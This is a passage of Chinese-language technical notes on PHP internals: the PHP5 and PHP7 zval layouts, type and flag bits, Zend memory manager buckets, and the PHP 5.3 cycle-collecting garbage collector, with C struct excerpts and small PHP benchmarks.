     zend_uchar is_ref__gc;
};
```
对PHP5内核有了解的同学应该对这个结构比较熟悉, 因为zval可以表示一切PHP中的数据类型, 所以它包含了一个type字段, 表示这个zval存储的是什么类型的值, 常见的可能选项是IS_NULL, IS_LONG, IS_STRING, IS_ARRAY, IS_OBJECT等等.

根据type字段的值不同, 我们就要用不同的方式解读value的值, 这个value是个联合体, 比如对于type是IS_STRING, 那么我们应该用value.str来解读zval.value字段, 而如果type是IS_LONG, 那么我们就要用value.lval来解读.

另外, 我们知道PHP是用引用计数来做基本的垃圾回收的, 所以zval中有一个refcount__gc字段, 表示这个zval的引用数目, 但这里有一个要说明的, 在5.3以前, 这个字段的名字还叫做refcount, 5.3以后, 在引入新的垃圾回收算法来对付循环引用计数的时候, 作者加入了大量的宏来操作refcount, 为了能让错误更快的显现, 所以改名为refcount__gc, 迫使大家都使用宏来操作refcount.

类似的, 还有is_ref, 这个值表示了PHP中的一个类型是否是引用, 这里我们可以看到是不是引用是一个标志位.

这就是PHP5时代的zval, 在2013年我们做PHP5的opcache JIT的时候, 因为JIT在实际项目中表现不佳, 我们转而意识到这个结构体的很多问题. 而PHPNG项目就是从改写这个结构体而开始的.

存在的问题

PHP5的zval定义是随着Zend Engine 2诞生的, 随着时间的推移, 当时设计的局限性也越来越明显:

首先这个结构体的大小是(在64位系统)24个字节, 我们仔细看这个zval.value联合体, 其中zend_object_value是最大的长板, 它导致整个value需要16个字节, 这个应该是很容易可以优化掉的, 比如把它挪出来, 用个指针代替,因为毕竟IS_OBJECT也不是最最常用的类型.

第二, 这个结构体的每一个字段都有明确的含义定义, 没有预留任何的自定义字段, 导致在PHP5时代做很多的优化的时候, 需要存储一些和zval相关的信息的时候, 不得不采用其他结构体映射, 或者外部包装后打补丁的方式来扩充zval, 比如5.3的时候新引入专门解决循环引用的GC, 它不得采用如下的比较hack的做法:

```
/* The following macroses override macroses from zend_alloc.h */
#undef  ALLOC_ZVAL
#define ALLOC_ZVAL(z)                                   \
    do {                                                \
        (z) = (zval*)emalloc(sizeof(zval_gc_info));     \
        GC_ZVAL_INIT(z);                                \
    } while (0)
它用zval_gc_info劫持了zval的分配:

typedef struct _zval_gc_info {
    zval z;
    union {
        gc_root_buffer       *buffered;
        struct _zval_gc_info *next;
    } u;
} zval_gc_info;
```

然后用zval_gc_info来扩充了zval, 所以实际上来说我们在PHP5时代申请一个zval其实真正的是分配了32个字节, 但其实GC只需要关心IS_ARRAY和IS_OBJECT类型, 这样就导致了大量的内存浪费.

还比如我之前做的Taint扩展, 我需要对于给一些字符串存储一些标记, zval里没有任何地方可以使用, 所以我不得不采用非常手段:
```
Z_STRVAL_PP(ppzval) = erealloc(Z_STRVAL_PP(ppzval), Z_STRLEN_PP(ppzval) + 1 + PHP_TAINT_MAGIC_LENGTH);
PHP_TAINT_MARK(*ppzval, PHP_TAINT_MAGIC_POSSIBLE);
```
就是把字符串的长度扩充一个int, 然后用magic number做标记写到后面去, 这样的做法安全性和稳定性在技术上都是没有保障的 第三, PHP的zval大部分都是按值传递, 写时拷贝的值, 但是有俩个例外, 就是对象和资源, 他们永远都是按引用传递, 这样就造成一个问题, 对象和资源在除了zval中的引用计数以外, 还需要一个全局的引用计数, 这样才能保证内存可以回收. 所以在PHP5的时代, 以对象为例, 它有俩套引用计数, 一个是zval中的, 另外一个是obj自身的计数:
```
typedef struct _zend_object_store_bucket {
    zend_bool destructor_called;
    zend_bool valid;
    union _store_bucket {
        struct _store_object {
            void *object;
            zend_objects_store_dtor_t dtor;
            zend_objects_free_object_storage_t free_storage;
            zend_objects_store_clone_t clone;
            const zend_object_handlers *handlers;
            zend_uint refcount;
            gc_root_buffer *buffered;
        } obj;
        struct {
            int next;
        } free_list;
    } bucket;
} zend_object_store_bucket;
```
除了上面提到的两套引用以外, 如果我们要获取一个object, 则我们需要通过如下方式:
```
EG(objects_store).object_buckets[Z_OBJ_HANDLE_P(z)].bucket.obj
```
经过漫长的多次内存读取, 才能获取到真正的objec对象本身. 效率可想而知.

这一切都是因为Zend引擎最初设计的时候, 并没有考虑到后来的对象. 一个良好的设计, 一旦有了意外, 就会导致整个结构变得复杂, 维护性降低, 这是一个很好的例子.

第四, 我们知道PHP中, 大量的计算都是面向字符串的, 然而因为引用计数是作用在zval的, 那么就会导致如果要拷贝一个字符串类型的zval, 我们别无他法只能复制这个字符串. 

当我们把一个zval的字符串作为key添加到一个数组里的时候, 我们别无他法只能复制这个字符串. 

虽然在PHP5.4的时候, 我们引入了INTERNED STRING, 但是还是不能根本解决这个问题.

还比如, PHP中大量的结构体都是基于Hashtable实现的, 增删改查Hashtable的操作占据了大量的CPU时间, 而字符串要查找首先要求它的Hash值, 理论上我们完全可以把一个字符串的Hash值计算好以后, 就存下来, 避免再次计算等等

第五, 这个是关于引用的, PHP5的时代, 我们采用写时分离, 但是结合到引用这里就有了一个经典的性能问题:
```
<?php
    function dummy($array) {}
    $array = range(1, 100000);
    $b = &$array;
    dummy($array);
?>
```
当我们调用dummy的时候, 本来只是简单的一个传值就行的地方, 但是因为`$array`曾经引用赋值给了`$b`, 所以导致`$array`变成了一个引用, 于是此处就会发生分离, 导致数组复制, 从而极大的拖慢性能, 这里有一个简单的测试:
```
<?php
$array = range(1, 100000);
function dummy($array) {}
$i = 0;
$start = microtime(true);
while($i++ < 100) {
    dummy($array);
}
printf("Used %sS\n", microtime(true) - $start);
$b = &$array; //注意这里, 假设我不小心把这个Array引用给了一个变量
$i = 0;
$start = microtime(true);
while($i++ < 100) {
    dummy($array);
}
printf("Used %ss\n", microtime(true) - $start);
?>
```
我们在5.6下运行这个例子, 得到如下结果:
```
$ php-5.6/sapi/cli/php /tmp/1.php
Used 0.00045204162597656s
Used 4.2051479816437s
```
相差1万倍之多. 这就造成, 如果在一大段代码中, 我不小心把一个变量变成了引用(比如foreach as &$v), 那么就有可能触发到这个问题, 造成严重的性能问题, 然而却又很难排查.

第六, 也是最重要的一个, 为什么说它重要呢? 因为这点促成了很大的性能提升, 我们习惯了在PHP5的时代调用MAKE_STD_ZVAL在堆内存上分配一个zval, 然后对他进行操作, 最后呢通过RETURN_ZVAL把这个zval的值"copy"给return_value, 然后又销毁了这个zval, 比如pathinfo这个函数:
```
PHP_FUNCTION(pathinfo)
{
.....
     MAKE_STD_ZVAL(tmp);
     array_init(tmp);
.....
    if (opt == PHP_PATHINFO_ALL) {
        RETURN_ZVAL(tmp, 0, 1);
    } else {
.....
}
```
这个tmp变量, 完全是一个临时变量的作用, 我们又何必在堆内存分配它呢?

MAKE_STD_ZVAL/ALLOC_ZVAL在PHP5的时候, 到处都有, 是一个非常常见的用法, 如果我们能把这个变量用栈分配, 那无论是内存分配, 还是缓存友好, 都是非常有利的

还有很多, 我就不一一详细列举了, 但是我相信你们也有了和我们当时一样的想法, zval必须得改改了, 对吧?

现在的zval

到了PHP7中, zval变成了如下的结构, 要说明的是, 这个是现在的结构, 已经和PHPNG时候有了一些不同了, 因为我们新增加了一些解释 (联合体的字段), 但是总体大小, 结构, 是和PHPNG的时候一致的:
```
struct _zval_struct {
     union {
          zend_long         lval;             /* long value */
          double            dval;             /* double value */
          zend_refcounted  *counted;
          zend_string      *str;
          zend_array       *arr;
          zend_object      *obj;
          zend_resource    *res;
          zend_reference   *ref;
          zend_ast_ref     *ast;
          zval             *zv;
          void             *ptr;
          zend_class_entry *ce;
          zend_function    *func;
          struct {
               uint32_t w1;
               uint32_t w2;
          } ww;
     } value;
    union {
        struct {
            ZEND_ENDIAN_LOHI_4(
                zend_uchar    type,         /* active type */
                zend_uchar    type_flags,
                zend_uchar    const_flags,
                zend_uchar    reserved)     /* call info for EX(This) */
        } v;
        uint32_t type_info;
    } u1;
    union {
        uint32_t     var_flags;
        uint32_t     next;                 /* hash collision chain */
        uint32_t     cache_slot;           /* literal cache slot */
        uint32_t     lineno;               /* line number (for ast nodes) */
        uint32_t     num_args;             /* arguments number for EX(This) */
        uint32_t     fe_pos;               /* foreach position */
        uint32_t     fe_iter_idx;          /* foreach iterator index */
    } u2;
};
```
虽然看起来变得好大, 但其实你仔细看, 全部都是联合体, 这个新的zval在64位环境下, 现在只需要16个字节(2个指针size), 它主要分为俩个部分, value和扩充字段, 而扩充字段又分为u1和u2俩个部分, 其中u1是type info, u2是各种辅助字段.

其中value部分, 是一个size_t大小(一个指针大小), 可以保存一个指针, 或者一个long, 或者一个double.

而type info部分则保存了这个zval的类型. 扩充辅助字段则会在多个其他地方使用, 比如next, 就用在取代Hashtable中原来的拉链指针, 这部分会在以后介绍HashTable的时候再来详解.

类型

PHP7中的zval的类型做了比较大的调整, 总体来说有如下17种类型:
```
/* regular data types */
#define IS_UNDEF                    0
#define IS_NULL                     1
#define IS_FALSE                    2
#define IS_TRUE                     3
#define IS_LONG                     4
#define IS_DOUBLE                   5
#define IS_STRING                   6
#define IS_ARRAY                    7
#define IS_OBJECT                   8
#define IS_RESOURCE                 9
#define IS_REFERENCE                10
/* constant expressions */
#define IS_CONSTANT                 11
#define IS_CONSTANT_AST             12
/* fake types */
#define _IS_BOOL                    13
#define IS_CALLABLE                 14
/* internal types */
#define IS_INDIRECT                 15
#define IS_PTR                      17
```
其中PHP5的时候的IS_BOOL类型, 现在拆分成了IS_FALSE和IS_TRUE俩种类型. 而原来的引用是一个标志位, 现在的引用是一种新的类型.

对于IS_INDIRECT和IS_PTR来说, 这俩个类型是用在内部的保留类型, 用户不会感知到, 这部分会在后续介绍HashTable的时候也一并介绍.

从PHP7开始, 对于在zval的value字段中能保存下的值, 就不再对他们进行引用计数了, 而是在拷贝的时候直接赋值, 这样就省掉了大量的引用计数相关的操作, 这部分类型有:
IS_LONG
IS_DOUBLE
对于那种根本没有值, 只有类型的类型, 也不需要引用计数了:
IS_NULL
IS_FALSE
IS_TRUE
而对于复杂类型, 一个size_t保存不下的, 那么我们就用value来保存一个指针, 这个指针指向这个具体的值, 引用计数也随之作用于这个值上, 而不在是作用于zval上了.

PHP7 zval示意图
以IS_ARRAY为例:
```
struct _zend_array {
    zend_refcounted_h gc;
    union {
        struct {
            ZEND_ENDIAN_LOHI_4(
                zend_uchar    flags,
                zend_uchar    nApplyCount,
                zend_uchar    nIteratorsCount,
                zend_uchar    reserve)
        } v;
        uint32_t flags;
    } u;
    uint32_t          nTableMask;
    Bucket           *arData;
    uint32_t          nNumUsed;
    uint32_t          nNumOfElements;
    uint32_t          nTableSize;
    uint32_t          nInternalPointer;
    zend_long         nNextFreeElement;
    dtor_func_t       pDestructor;
};
```
zval.value.arr将指向上面的这样的一个结构体, 由它实际保存一个数组, 引用计数部分保存在zend_refcounted_h结构中:
```
typedef struct _zend_refcounted_h {
    uint32_t         refcount;          /* reference counter 32-bit */
    union {
        struct {
            ZEND_ENDIAN_LOHI_3(
                zend_uchar    type,
                zend_uchar    flags,    /* used for strings & objects */
                uint16_t      gc_info)  /* keeps GC root number (or 0) and color */
        } v;
        uint32_t type_info;
    } u;
} zend_refcounted_h;
```
所有的复杂类型的定义, 开始的时候都是zend_refcounted_h结构, 这个结构里除了引用计数以外, 还有GC相关的结构. 从而在做GC回收的时候, GC不需要关心具体类型是什么, 所有的它都可以当做zend_refcounted*结构来处理.

另外有一个需要说明的就是大家可能会好奇的ZEND_ENDIAN_LOHI_4宏, 这个宏的作用是简化赋值, 它会保证在大端或者小端的机器上, 它定义的字段都按照一样顺序排列存储, 从而我们在赋值的时候, 不需要对它的字段分别赋值, 而是可以统一赋值, 比如对于上面的array结构为例, 就可以通过:
```
arr1.u.flags = arr2.u.flags;
一次完成相当于如下的赋值序列:

arr1.u.v.flags                    = arr2.u.v.flags;
arr1.u.v.nApplyCount           = arr2.u.v.nApplyCount;
arr1.u.v.nIteratorsCount     = arr2.u.v.nIteratorsCount;
arr1.u.v.reserve                = arr2.u.v.reserve;
```
还有一个大家可能会问到的问题是, 为什么不把type类型放到zval类型的前面, 因为我们知道当我们去用一个zval的时候, 首先第一点肯定是先去获取它的类型. 这里的一个原因是, 一个是俩者差别不大, 另外就是考虑到如果以后JIT的话, zval的类型如果能够通过类型推导获得, 就根本没有必要去读取它的type值了.

标志位

除了数据类型以外， 以前的经验也告诉我们， 一个数据除了它的类型以外， 还应该有很多其他的属性， 比如对于INTERNED STRING，它是一种在整个PHP请求期都存在的字符串(比如你写在代码中的字面量), 它不会被引用计数回收. 在5.4的版本中我们是通过预先申请一块内存， 然后再这个内存中分配字符串， 最后用指针地址来比较， 如果一个字符串是属于INTERNED STRING的内存范围内， 就认为它是INTERNED STRING. 这样做的缺点显而易见， 就是当内存不够的时候， 我们就没有办法分配INTERNED STRING了， 另外也非常丑陋， 所以如果一个字符串能有一些属性定义则这个实现就可以变得很优雅.

还有， 比如现在我们对于IS_LONG, IS_TRUE等类型不再进行引用计数了， 那么当我们拿到一个zval的时候如何判断它需要不需要引用计数呢？ 想当然的我们可能会说用:
```
if (Z_TYPE_P(zv) >= IS_STRING) {
  //需要引用计数
}
但是你忘了， 还有INTERNED STRING的存在啊， 所以你也许要这么写了：

if (Z_TYPE_P(zv) >= IS_STRING && !IS_INTERNED(Z_STR_P(zv))) {
  //需要引用计数
}
是不是已经让你感觉到有点不对劲了? 嗯，别急， 还有呢， 我们还在5.6的时候引入了常量数组， 
这个数组呢会存储在Opcache的共享内存中， 它也不需要引用计数：

if (Z_TYPE_P(zv) >= IS_STRING && !IS_INTERNED(Z_STR_P(zv))
    && (Z_TYPE_P(zv) != IS_ARRAY || !Z_IS_IMMUTABLE(Z_ARRVAL(zv)))) {
 //需要引用计数
}
```
你是不是也觉得这简直太丑陋了， 简直不能忍受这样墨迹的代码， 对吧？

是的，我们早想到了，回头看之前的zval定义， 注意到type_flags了么? 我们引入了一个标志位， 叫做IS_TYPE_REFCOUNTED, 它会保存在zval.u1.v.type_flags中， 我们对于需要引用计数的类型就赋予这个标志， 所以上面的判断就可以变得很优雅：
```
if (!(Z_TYPE_FLAGS(zv) & IS_TYPE_REFCOUNTED)) {
}
```
而对于INTERNED STRING来说， 这个IS_STR_INTERNED标志位应该是作用于字符串本身而不是zval的.

那么类似这样的标志位一共有多少呢？作用于zval的有：
```
IS_TYPE_CONSTANT            //是常量类型
IS_TYPE_IMMUTABLE           //不可变的类型， 比如存在共享内存的数组
IS_TYPE_REFCOUNTED          //需要引用计数的类型
IS_TYPE_COLLECTABLE         //可能包含循环引用的类型(IS_ARRAY, IS_OBJECT)
IS_TYPE_COPYABLE            //可被复制的类型， 还记得我之前讲的对象和资源的例外么？ 对象和资源就不是
IS_TYPE_SYMBOLTABLE         //zval保存的是全局符号表， 这个在我之前做了一个调整以后没用了， 但还保留着兼容，
                            //下个版本会去掉
作用于字符串的有:

IS_STR_PERSISTENT             //是malloc分配内存的字符串
IS_STR_INTERNED             //INTERNED STRING
IS_STR_PERMANENT            //不可变的字符串， 用作哨兵作用
IS_STR_CONSTANT             //代表常量的字符串
IS_STR_CONSTANT_UNQUALIFIED //带有可能命名空间的常量字符串
作用于数组的有:

#define IS_ARRAY_IMMUTABLE  //同IS_TYPE_IMMUTABLE
作用于对象的有：

IS_OBJ_APPLY_COUNT          //递归保护
IS_OBJ_DESTRUCTOR_CALLED    //析构函数已经调用
IS_OBJ_FREE_CALLED          //清理函数已经调用
IS_OBJ_USE_GUARDS           //魔术方法递归保护
IS_OBJ_HAS_GUARDS           //是否有魔术方法递归保护标志
```
有了这些预留的标志位， 我们就会很方便的做一些以前不好做的事情， 就比如我自己的Taint扩展， 现在把一个字符串标记为污染的字符串就会变得无比简单：
```
/* it's important that make sure
 * this value is not used by Zend or
 * any other extension agianst string */
#define IS_STR_TAINT_POSSIBLE    (1<<7)
#define TAINT_MARK(str)     (GC_FLAGS((str)) |= IS_STR_TAINT_POSSIBLE)
```
这个标记就会一直随着这个字符串的生存而存在的， 省掉了我之前的很多tricky的做法.

zval预先分配

前面我们说过, PHP5的zval分配采用的是堆上分配内存, 也就是在PHP预案代码中随处可见的MAKE_STD_ZVAL和ALLOC_ZVAL宏. 

我们也知道了本来一个zval只需要24个字节, 但是算上gc_info, 其实分配了32个字节, 再加上PHP自己的内存管理在分配内存的时候都会在内存前面保留一部分信息:
```
typedef struct _zend_mm_block {
    zend_mm_block_info info;
#if ZEND_DEBUG
    unsigned int magic;
# ifdef ZTS
    THREAD_T thread_id;
# endif
    zend_mm_debug_info debug;
#elif ZEND_MM_HEAP_PROTECTION
    zend_mm_debug_info debug;
#endif
} zend_mm_block;
```
从而导致实际上我们只需要24字节的内存, 但最后竟然分配48个字节之多.

然而大部分的zval, 尤其是扩展函数内的zval, 我们想想它接受的参数来自外部的zval, 它把返回值返回给return_value, 这个也是来自外部的zval, 而中间变量的zval完全可以采用栈上分配. 

也就是说大部分的内部函数都不需要在堆上分配内存, 它需要的zval都可以来自外部.

于是当时我们做了一个大胆的想法, 所有的zval都不需要单独申请.

而这个也很容易证明, PHP脚本中使用的zval, 要么存在于符号表, 要么就以临时变量(IS_TMP_VAR)或者编译变量(IS_CV)的形式存在.

前者存在于一个Hashtable中, 而在PHP7中Hashtable默认保存的就是zval, 这部分的zval完全可以在Hashtable分配的时候一次性分配出来, 后面的存在于execute_data之后, 数量也在编译时刻确定好了, 也可以随着execute_data一次性分配, 所以我们确实不再需要单独在堆上申请zval了.

所以, 在PHP7开始, 我们移除了MAKE_STD_ZVAL/ALLOC_ZVAL宏, 不再支持存堆内存上申请zval. 

函数内部使用的zval要么来自外面输入, 要么使用在栈上分配的临时zval.

在后来的实践中, 总结出来的可能对于开发者来说最大的变化就是, 之前的一些内部函数, 通过一些操作获得一些信息, 然后分配一个zval, 返回给调用者的情况:
```
static zval * php_internal_function() {
    .....
    str = external_function();
    MAKE_STD_ZVAL(zv);
    ZVAL_STRING(zv, str, 0);
     return zv;
}
PHP_FUNCTION(test) {
     RETURN_ZVAL(php_internal_function(), 1, 1);
}
```
要么修改为, 这个zval由调用者传递:

```
static void php_internal_function(zval *zv) {
    .....
    str = external_function();
    ZVAL_STRING(zv, str);
     efree(str);
}
PHP_FUNCTION(test) {
     php_internal_function(return_value);
}
要么修改为, 这个函数返回原始素材:

static char * php_internal_function() {
    .....
    str = external_function();
     return str;
}
PHP_FUNCTION(test) {
     str = php_internal_function();
     RETURN_STRING(str);
     efree(str);
}
```
总结

(这块还没想好怎么说, 本来我是要引出Hashtable不再存在zval**, 从而引出引用类型的存在的必要性, 但是如果不先讲Hashtable的结构, 这个引出貌似很突兀, 先这么着吧, 以后再来修改)

到现在我们基本上把zval的变化概况介绍完毕, 抽象的来说, 其实在PHP7中的zval, 已经变成了一个值指针, 它要么保存着原始值, 要么保存着指向一个保存原始值的指针. 也就是说现在的zval相当于PHP5的时候的zval *. 

只不过相比于zval *, 直接存储zval, 我们可以省掉一次指针解引用, 从而提高缓存友好性.

其实PHP7的性能, 我们并没有引入什么新的技术模式, 不过就是主要来自, 持续不懈的降低内存占用, 提高缓存友好性, 降低执行的指令数的这些原则而来的, 可以说PHP7的重构就是这三个原则.

### 内存管理

https://www.jianshu.com/p/63a381a7f70c

https://www.jianshu.com/p/63a381a7f70c

1） 操作系统直接管理着内存，所以操作系统也需要进行内存管理， 计算机中通常都有内存管理单元(MMU) 用于处理CPU对内存的访问。

2） 应用程序无法直接调用物理内存， 只能向系统申请内存。 向操作系统申请内存空间会引发系统调用。 系统调用会将CPU从用户态切换到内核。 为了减少系统调用开销。通常在用户态进行内存管理。 申请大块内存备用。 使用完的内存不马上释放，将内存复用，避免多次内存申请和释放所带来性能消耗。

3） PHP不需要显示内存管理，由Zend引擎进行管理。

PHP内存限制

1）php.ini中的默认32MB

memory_limit = 32M

2）动态修改内存

ini_set ("memory_limit", "128M")

3）获取目前内存占用

memory_get_usage() : 获取PHP脚本所用的内存大小

memory_get_peak_usage() ：返回当前脚本到目前位置所占用的内存峰值。

学习内存管理的目的

了解PHP如何占用内存，可以避免不必要的内存浪费。

PHP中的内存管理###

包含：

1）足够内存

2）可用内存获取部分内存

3）使用后的内存，是否销毁还是重新分配

PHP内存管理器

接口层，是一些宏定义。

**堆层 heap **

_zend_mm_heap

初始化内存，调用 zend_mm_startup

PHP内存管理维护三个列表:

1)小块内存列表 free_buckets

2)大块内存列表 large_free_buckets

3)剩余内存列表 rest_buckets

两个HashTable 结构，难点是查找和计算内存地址

1)free_buckets

Hash函数为：

#define ZEND_MM_BUCKET_INDEX(true_size) ((true_size>>ZEND_MM_ALIGNMENT_LOG2)-(ZEND_MM_ALIGNED_MIN_HEADER_SIZE>>ZEND_MM_ALIGNMENT_LOG2))

2)large_free_buckets

Hash函数为：
```
#define ZEND_MM_LARGE_BUCKET_INDEX(S) zend_mm_high_bit(S)
    static inline unsigned int zend_mm_high_bit(size_t _size){
       ..//省略若干不同环境的实现
      unsignedint n =0;
      while(_size !=0) { 
        _size = _size >>1; n++;}
        return n-1;
    }
```
存储层 storage

内存分配的方式对堆层透明化，实现存储层和heap层的分离。

不同的内存分配方案， 有对应的处理函数。

内存的申请

PHP底层对内存的管理， 围绕着小块内存列表（free_buckets）、 大块内存列表（large_free_buckets）和 剩余内存列表（rest_buckets）三个列表来分层进行的

ZendMM向系统进行的内存申请，并不是有需要时向系统即时申请， 而是由ZendMM的最底层（heap层） 先向系统申请一大块的内存，通过对上面三种列表的填充， 建立一个类似于内存池的管理机制。 

在程序运行需要使用内存的时候，ZendMM会在内存池中分配相应的内存供使用。 

这样做的好处是避免了PHP向系统频繁的内存申请操作

ZendMM对内存分配的处理步骤：

1）内存检查；

2）命中缓存，找到内存块，调至步骤5；

3）在ZendMM管理的heap层存储中搜索合适大小的内存块, 是在三种列表中小到大进行的，找到block后，调至步骤5；

4）步骤3未找到内存，则使用 ZEND_MM_STORAGE_ALLOC 申请新内存块 （至少为ZEND_MM_SEG_SIZE）,进行步骤6

5）使用zend_mm_remove_from_free_list函数将已经使用block节点在zend_mm_free_block中移除;

6） 内存分配完毕，对zend_mm_heap结构中的各种标识型变量进行维护，包括large_free_buckets， peak，size等;

7） 返回分配的内存地址;

PHP内存管理器

内存的销毁

ZendMM在内存销毁的处理上采用与内存申请相同的策略，当程序unset一个变量或者是其他的释放行为时， ZendMM并不会直接立刻将内存交回给系统，而是只在自身维护的内存池中将其重新标识为可用， 按照内存的大小整理到上面所说的三种列表（small,large,free）之中，以备下次内存申请时使用。

ZendMM将内存块以整理收回到zend_mm_heap的方式，回收到内存池中。

程序使用的所有内存，将在进程结束时统一交还给系统。

垃圾回收

自动回收内存的过程叫垃圾收集。PHP提供了语言层的垃圾回收机制，让程序员不必过分关心程序内存分配。

PHP5.3之前 引用计数方式的内存动态管理。

PHP中所有的变量都是以zval变量的形式存在。

变量引用计数变为0时，PHP将在内存中销毁这个变量。只是这里的垃圾并不能称之为垃圾。

并且PHP在一个生命周期结束后就会释放此进程/线程所占的内容，这种方式决定了PHP在前期不需要过多考虑内存的泄露问题。

PHP5.3的垃圾回收

引入垃圾收集机制的目的是为了打破引用计数中的循环引用，从而防止因为这个而产生的内存泄露。 

垃圾收集机制基于PHP的动态内存管理而存在。PHP5.3为引入垃圾收集机制，在变量存储的基本结构上有一些变动.
```
struct _zval_struct {
  /* Variable information */ 
  zvalue_value value;/* value */ 
  zend_uint refcount__gc; 
  zend_uchar type;/* active type */ 
  zend_uchar is_ref__gc;
};
```
添加了 __gc 以用于新的垃圾回收机制。

PHP5.3中的垃圾回收算法——Concurrent Cycle Collection in Reference Counted Systems

PHP5.3的垃圾回收算法仍然以引用计数为基础，但是不再是使用简单计数作为回收准则， 而是使用了一种同步回收算法，这个算法由IBM的工程师在论文Concurrent Cycle Collection in Reference Counted Systems中提出。

论文较复杂， 列出一些大体描述。

首先PHP会分配一个固定大小的“根缓冲区”，这个缓冲区用于存放固定数量的zval，这个数量默认是10,000， 如果需要修改则需要修改源代码Zend/zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES然后重新编译。

由上文我们可以知道，一个zval如果有引用，要么被全局符号表中的符号引用，要么被其它表示复杂类型的zval中的符号引用。

因此在zval中存在一些可能根（root）。这里我们暂且不讨论PHP是如何发现这些可能根的， 这是个很复杂的问题，总之PHP有办法发现这些可能根zval并将它们投入根缓冲区。

当根缓冲区满额时，PHP就会执行垃圾回收，此回收算法如下：

1、对每个根缓冲区中的根zval按照深度优先遍历算法遍历所有能遍历到的zval，并将每个zval的refcount减1， 同时为了避免对同一zval多次减1（因为可能不同的根能遍历到同一个zval），每次对某个zval减1后就对其标记为“已减”。

2、再次对每个缓冲区中的根zval深度优先遍历，如果某个zval的refcount不为0，则对其加1，否则保持其为0。

3、清空根缓冲区中的所有根（注意是把这些zval从缓冲区中清除而不是销毁它们），然后销毁所有refcount为0的zval，并收回其内存。

如果不能完全理解也没有关系，只需记住PHP5.3的垃圾回收算法有以下几点特性：

1、并不是每次refcount减少时都进入回收周期，只有根缓冲区满额后在开始垃圾回收。

2、可以解决循环引用问题。

3、可以总将内存泄露保持在一个阈值以下。

PHP5.2与PHP5.3垃圾回收算法的性能比较

PHP Manual中的相关章节：http://docs.php.net/manual/zh/features.gc.performance-considerations.php

首先是内存泄露试验，下面直接引用PHP Manual中的实验代码和试验结果图：
```
<?php
class Foo
{
   public $var = '3.1415962654';
}
$baseMemory = memory_get_usage();
for ( $i = 0; $i <= 100000; $i++ )
{
   $a = new Foo;
   $a->self = $a;
   if ( $i % 500 === 0 )
   {
       echo sprintf( '%8d: ', $i ), memory_get_usage() - $baseMemory, "\n";
   }
}
?>
```
可以看到在可能引发累积性内存泄露的场景下，PHP5.2发生持续累积性内存泄露， 而PHP5.3则总能将内存泄露控制在一个阈值以下（与根缓冲区大小有关）。

与垃圾回收算法相关的PHP配置

1、可以通过修改php.ini中的zend.enable_gc来打开或关闭PHP的垃圾回收机制， 也可以通过调用gc_enable()或gc_disable()打开或关闭PHP的垃圾回收机制。

2、在PHP5.3中即使关闭了垃圾回收机制，PHP仍然会记录可能根到根缓冲区， 只是当根缓冲区满额时，PHP不会自动运行垃圾回收

3、当然，任何时候您都可以通过手工调用gc_collect_cycles()函数强制执行内存回收。

### 垃圾回收机制
http://php.net/manual/zh/features.gc.php

http://php.net/manual/zh/features.gc.php

引用计数基本知识

每个php变量存在一个叫"zval"的变量容器中。一个zval变量容器，除了包含变量的类型和值， 还包括两个字节的额外信息。第一个是"is_ref"，是个bool值，用来标识这个变量是否是属于引用集合(reference set)。

通过这个字节，php引擎才能把普通变量和引用变量区分开来，由于php允许用户通过使用&来使用自定义引用， zval变量容器中还有一个内部引用计数机制，来优化内存使用。第二个额外字节是"refcount"， 用以表示指向这个zval变量容器的变量(也称符号即symbol)个数。所有的符号存在一个符号表中， 其中每个符号都有作用域(scope)，那些主脚本(比如：通过浏览器请求的的脚本)和每个函数或者方法也都有作用域。

回收周期(Collecting Cycles)

传统上，像以前的 php 用到的引用计数内存机制，无法处理循环的引用内存泄漏。

然而 5.3.0 PHP 使用文章» 引用计数系统中的同步周期回收 (Concurrent Cycle Collection in Reference Counted Systems)中的同步算法，来处理这个内存泄漏问题。

对算法的完全说明有点超出这部分内容的范围，将只介绍其中基础部分。首先，我们先要建立一些基本规则， 如果一个引用计数增加，它将继续被使用，当然就不再在垃圾中。如果引用计数减少到零，所在变量容器将被清除(free)。

就是说，仅仅在引用计数减少到非零值时，才会产生垃圾周期(garbage cycle)。其次，在一个垃圾周期中， 通过检查引用计数是否减1，并且检查哪些变量容器的引用次数是零，来发现哪部分是垃圾。

垃圾回收算法

为避免不得不检查所有引用计数可能减少的垃圾周期，这个算法把所有可能根(possible roots 都是zval变量容器), 放在根缓冲区(root buffer)中(用紫色来标记，称为疑似垃圾)，这样可以同时确保每个可能的垃圾根(possible garbage root) 在缓冲区中只出现一次。仅仅在根缓冲区满了时，才对缓冲区内部所有不同的变量容器执行垃圾回收操作。看上图的步骤 A。

在步骤 B 中，模拟删除每个紫色变量。模拟删除时可能将不是紫色的普通变量引用数减"1"，如果某个普通变量引用计数变成0了， 就对这个普通变量再做一次模拟删除。每个变量只能被模拟删除一次，模拟删除后标记为灰（原文说确保不会对同一个变量容器减两次"1",不对的吧）。

在步骤 C 中，模拟恢复每个紫色变量。恢复是有条件的，当变量的引用计数大于0时才对其做模拟恢复。

同样每个变量只能恢复一次，恢复后标记为黑，基本就是步骤 B 的逆运算。

这样剩下的一堆没能恢复的就是该删除的蓝色节点了，在步骤 D 中遍历出来真的删除掉。

算法中都是模拟删除、模拟恢复、真的删除，都使用简单的遍历即可（最典型的深搜遍历）。

复杂度为执行模拟操作的节点数正相关，不只是紫色的那些疑似垃圾变量。

现在，你已经对这个算法有了基本了解，我们回头来看这个如何与PHP集成。默认的， PHP的垃圾回收机制是打开的，然后有个 php.ini 设置允许你修改它：zend.enable_gc。

当垃圾回收机制打开时，每当根缓存区存满时，就会执行上面描述的循环查找算法。

根缓存区有固定的大小，可存10,000个可能根,当然你可以通过修改PHP源码文件Zend/zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES， 然后重新编译PHP，来修改这个10,000值。当垃圾回收机制关闭时，循环查找算法永不执行，然而， 可能根将一直存在根缓冲区中，不管在配置中垃圾回收机制是否激活。

当垃圾回收机制关闭时，如果根缓冲区存满了可能根，更多的可能根显然不会被记录。那些没被记录的可能根， 将不会被这个算法来分析处理。如果他们是循环引用周期的一部分，将永不能被清除进而导致内存泄漏。

即使在垃圾回收机制不可用时，可能根也被记录的原因是，相对于每次找到可能根后检查垃圾回收机制是否打开而言， 记录可能根的操作更快。不过垃圾回收和分析机制本身要耗不少时间。

除了修改配置zend.enable_gc，也能通过分别调用gc_enable() 和 gc_disable()函数来打开和关闭垃圾回收机制。

